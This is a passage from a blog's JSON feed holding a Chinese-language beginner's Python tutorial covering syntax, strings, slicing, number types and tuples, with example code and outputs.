{
    "version": "https://jsonfeed.org/version/1",
    "title": "逐梦 • All posts by \"学习\" tag",
    "description": "Welcome to my blog",
    "home_page_url": "https://0xdadream.github.io",
    "items": [
        {
            "id": "https://0xdadream.github.io/2021/10/10/python-study/",
            "url": "https://0xdadream.github.io/2021/10/10/python-study/",
            "title": "python学习",
            "date_published": "2021-10-09T18:11:00.000Z",
            "content_html": "<h1 id=\"python学习\"><a href=\"#python学习\" class=\"headerlink\" title=\"python学习\"></a>python学习</h1><h2 id=\"基础语法\"><a href=\"#基础语法\" class=\"headerlink\" title=\"基础语法\"></a>基础语法</h2><h3 id=\"标识符\"><a href=\"#标识符\" class=\"headerlink\" title=\"标识符\"></a>标识符</h3><ol>\n<li>首字母必须是字母或者下划线<code>_</code></li>\n<li>其他部分由字母、数字、下划线组成</li>\n<li>大小写敏感</li>\n<li>python3 可中文也可非ASCII标识符</li>\n</ol>\n<h3 id=\"python保留字\"><a href=\"#python保留字\" class=\"headerlink\" title=\"python保留字\"></a>python保留字</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> keyword\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>keyword<span class=\"token punctuation\">.</span>kwlist<span class=\"token punctuation\">)</span>\n\n<span class=\"token punctuation\">[</span><span class=\"token string\">'False'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'None'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'True'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'and'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'as'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'assert'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'async'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'await'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'break'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'class'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'continue'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'def'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'del'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'elif'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'else'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'except'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'finally'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'for'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'from'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'global'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'if'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'import'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'in'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'is'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'lambda'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'nonlocal'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'not'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'or'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'pass'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'raise'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'return'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'try'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'while'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'with'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'yield'</span><span class=\"token punctuation\">]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"注释\"><a href=\"#注释\" class=\"headerlink\" title=\"注释\"></a>注释</h3><p>python中<code>'</code>和<code>\"</code>一样</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">#单行注释\n\n'''\n多行注释\n'''\n\n\"\"\"\n多行注释\n\"\"\"<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"缩进\"><a href=\"#缩进\" class=\"headerlink\" title=\"缩进\"></a>缩进</h3><p>python不使用大括号，使用缩进对齐</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">if</span> expression <span class=\"token punctuation\">:</span>\n    XXX\n<span class=\"token keyword\">else</span> <span class=\"token punctuation\">:</span>\n    XXX<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"多行连接\"><a href=\"#多行连接\" class=\"headerlink\" title=\"多行连接\"></a>多行连接</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">var <span class=\"token operator\">=</span> <span class=\"token number\">1</span> <span class=\"token operator\">+</span> \\\n\t <span class=\"token number\">2</span> <span class=\"token operator\">+</span> \\\n    <span class=\"token number\">3</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>var<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#6</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"数字类型\"><a href=\"#数字类型\" class=\"headerlink\" title=\"数字类型\"></a>数字类型</h3><p>python中数字有四种类型：整数、布尔型、浮点数和复数</p>\n<h3 id=\"字符串\"><a href=\"#字符串\" class=\"headerlink\" title=\"字符串\"></a>字符串</h3><ol>\n<li>python中单引号、双引号使用完全相同</li>\n<li>转义字符<code>\\</code></li>\n<li><code>r'test\\ntest'</code>，<code>r</code>可以使<code>\\n</code>不转义</li>\n<li><code>\"this \" \"is \" \"string\"</code>输出<code>this is string</code></li>\n<li><code>+</code>运算符连接字符，<code>*</code>运算符重复字符</li>\n<li>检索从左到右从0开始，从右到左从-1开始</li>\n<li>一个字符就是一个长度为1的字符串</li>\n</ol>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">var <span class=\"token operator\">=</span> <span class=\"token string\">\"this \"</span> <span class=\"token string\">\"is \"</span> <span class=\"token string\">\"string\"</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>var<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># this is string</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>var <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># this is stringthis is string</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>var <span class=\"token operator\">+</span> <span class=\"token string\">'111'</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># this is string111</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ssss\\nsssss'</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># ssss</span>\n<span class=\"token comment\"># sssss</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">r\"ssss\\nssss\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># ssss\\nssss</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>var<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># this is string</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>var<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># this is string</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>var<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># this is strin</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>var<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># ti ssrn</span>\n<span class=\"token triple-quoted-string string\">'''\nthis is string\nthis is stringthis is string\nthis is string111\nssss\nsssss\nssss\\nssss\nthis is string\nthis is string\nthis is strin\nti ssrn\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"一行多条语句\"><a href=\"#一行多条语句\" class=\"headerlink\" title=\"一行多条语句\"></a>一行多条语句</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> sys<span class=\"token punctuation\">;</span> x <span class=\"token operator\">=</span> <span class=\"token string\">'test'</span><span class=\"token punctuation\">;</span> sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>x <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\ntest\n\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"多个语句组成代码组\"><a href=\"#多个语句组成代码组\" class=\"headerlink\" title=\"多个语句组成代码组\"></a>多个语句组成代码组</h3><p>首行以关键字开始，以冒号( : )结束，该行之后的一行或多行代码构成代码组</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">if</span> expression <span class=\"token punctuation\">:</span> \n   suite\n<span class=\"token keyword\">elif</span> expression <span class=\"token punctuation\">:</span> \n   suite \n<span class=\"token keyword\">else</span> <span class=\"token punctuation\">:</span> \n   suite<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"输出\"><a href=\"#输出\" class=\"headerlink\" title=\"输出\"></a>输出</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">var <span class=\"token operator\">=</span> <span class=\"token string\">'test'</span>\n<span class=\"token comment\"># 换行输出</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>var<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'---------'</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 不换行输出</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>var<span class=\"token punctuation\">,</span> end<span class=\"token operator\">=</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 以空格分隔</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">,</span> end<span class=\"token operator\">=</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\ntest\n1\n---------\ntest 1 \n\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"导入模块\"><a href=\"#导入模块\" class=\"headerlink\" title=\"导入模块\"></a>导入模块</h3><p>在 python 用 <strong>import</strong> 或者 <strong>from…import</strong> 来导入相应的模块</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> sys\n<span class=\"token keyword\">from</span> sys <span class=\"token keyword\">import</span> argv<span class=\"token punctuation\">,</span>path<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h2 id=\"数据类型\"><a href=\"#数据类型\" class=\"headerlink\" title=\"数据类型\"></a>数据类型</h2><p>python的变量就是对象</p>\n<p>python变量直接赋值，不需要声明</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">a <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\nb <span class=\"token operator\">=</span> <span class=\"token number\">1.2</span>\nc <span class=\"token operator\">=</span> <span class=\"token string\">'test'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"多个变量赋值\"><a href=\"#多个变量赋值\" class=\"headerlink\" title=\"多个变量赋值\"></a>多个变量赋值</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">a <span class=\"token operator\">=</span> b <span class=\"token operator\">=</span>c <span class=\"token operator\">=</span><span class=\"token number\">1</span>\na<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c <span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'test'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h3 id=\"不可变数据\"><a href=\"#不可变数据\" class=\"headerlink\" title=\"不可变数据\"></a>不可变数据</h3><h4 id=\"Number-数字\"><a href=\"#Number-数字\" class=\"headerlink\" title=\"Number(数字)\"></a>Number(数字)</h4><p>支持int、float、bool、complex（复数）</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d <span class=\"token operator\">=</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5.5</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token operator\">+</span><span class=\"token number\">3j</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n&lt;class 'int'&gt; &lt;class 'float'&gt; &lt;class 'bool'&gt; &lt;class 'complex'&gt;\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><code>type()</code>函数查询变量的类型</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">a <span class=\"token operator\">=</span> <span class=\"token number\">111</span>\n<span class=\"token builtin\">isinstance</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\nTrue\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><code>isinstance(x,x)</code>对比对象类型</p>\n<ul>\n<li><code>type()</code>不会认为子类是一种父类类型</li>\n<li><code>isinstance()</code>会认为子类是一种父类类型</li>\n</ul>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">A</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">pass</span>\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">B</span><span class=\"token punctuation\">(</span>A<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">pass</span>\n\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">isinstance</span><span class=\"token punctuation\">(</span>A<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> A<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># True</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>A<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> A<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># Ture</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">isinstance</span><span class=\"token punctuation\">(</span>B<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> A<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># Ture</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>B<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> A<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># False</span>\n<span class=\"token triple-quoted-string string\">'''\nTrue\nTrue\nTrue\nFalse\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"bool值处理\"><a href=\"#bool值处理\" class=\"headerlink\" title=\"bool值处理\"></a>bool值处理</h5><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">issubclass</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># Ture</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">True</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># Ture</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">False</span><span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># Ture</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">True</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 2</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">False</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 1</span>\nvar1 <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>var1 <span class=\"token keyword\">is</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># False</span>\nvar2 <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>var2 <span class=\"token keyword\">is</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># False</span>\n<span class=\"token triple-quoted-string string\">'''\nTrue\nTrue\nTrue\n2\n1\nFalse\nFalse\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"删除对象\"><a href=\"#删除对象\" class=\"headerlink\" title=\"删除对象\"></a>删除对象</h5><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">del</span> a\n<span class=\"token keyword\">del</span> var1<span class=\"token punctuation\">,</span>var2\n\n<span class=\"token triple-quoted-string string\">'''\n再次print会报错\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"数值运算\"><a href=\"#数值运算\" class=\"headerlink\" title=\"数值运算\"></a>数值运算</h5><ol>\n<li>除法<code>/</code>返回一个浮点数，<code>//</code>返回一个整数</li>\n<li><code>*</code>乘法，<code>**</code>乘方</li>\n<li><code>%</code>取余</li>\n<li>混合运算时整型转换为浮点型</li>\n<li>复数使用<code>complex(a,b)</code>表示<code>a+bj</code></li>\n</ol>\n<h4 id=\"String-字符串\"><a href=\"#String-字符串\" class=\"headerlink\" title=\"String(字符串)\"></a>String(字符串)</h4><h5 id=\"字符串截取格式\"><a href=\"#字符串截取格式\" class=\"headerlink\" title=\"字符串截取格式\"></a>字符串截取格式</h5><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">变量名<span class=\"token punctuation\">[</span>头下标<span class=\"token punctuation\">:</span>尾下标<span class=\"token punctuation\">]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>从前面索引  0 1 2 3 4 ……</p>\n<p>从后面索引  -1 -2 -3 -4 -5 ……</p>\n<p>从前面截取 :1 2 3 4:</p>\n<p>从后面截取 :-4 -3 -2 -1:</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">'test'</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># test</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># t</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出所有字符</span>\n<span class=\"token comment\"># test</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出第一个到倒数第二个</span>\n<span class=\"token comment\"># tes</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token comment\"># 输出第三个到第四个</span>\n<span class=\"token comment\"># st</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># testtest</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span> <span class=\"token operator\">+</span> <span class=\"token string\">'re'</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># testre</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># t t</span>\n<span class=\"token triple-quoted-string string\">'''\ntest\nt\ntest\ntes\nst\ntesttest\ntestre\nt t\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>python字符串不能改变，诸如<code>str[n]='?'</code>的赋值会报错</p>\n<h4 id=\"Tuple-元组\"><a href=\"#Tuple-元组\" class=\"headerlink\" title=\"Tuple(元组)\"></a>Tuple(元组)</h4><ol>\n<li>元组元素不能更改</li>\n<li>元组写在小括号内，以<code>,</code>分隔</li>\n<li>各元素类型可以不同</li>\n<li>元组的索引切片操作与string一样</li>\n</ol>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token builtin\">tuple</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1.2</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'test'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'dou'</span><span class=\"token punctuation\">)</span>\ntuple2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'test2'</span><span class=\"token punctuation\">)</span>\ntuple3 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 单个元素后面加逗号</span>\ntuple4 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 空元组</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>tuple4<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># ()</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">tuple</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># (1, 1.2, 'test', 'dou')</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>tuple3<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># (1,)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">tuple</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出第一个元素</span>\n<span class=\"token comment\"># 1</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">tuple</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出第二个到第三个元素</span>\n<span class=\"token comment\"># (1.2, 'test')</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">tuple</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出所有元素</span>\n<span class=\"token comment\"># (1, 1.2, 'test', 'dou')</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">tuple</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出所有元素</span>\n<span class=\"token comment\"># (1, 1.2, 'test', 'dou')</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">tuple</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出第三个及前面的所有</span>\n<span class=\"token comment\"># (1, 1.2, 'test')</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">tuple</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># (1, 1.2, 'test', 'dou', 1, 1.2, 'test', 'dou')</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">tuple</span> <span class=\"token operator\">+</span> tuple2<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># (1, 1.2, 'test', 'dou', 1, 'test2')</span>\n<span class=\"token triple-quoted-string string\">'''\n()\n(1, 1.2, 'test', 'dou')\n(1,)\n1\n(1.2, 'test')\n(1, 1.2, 'test', 'dou')\n(1, 1.2, 'test', 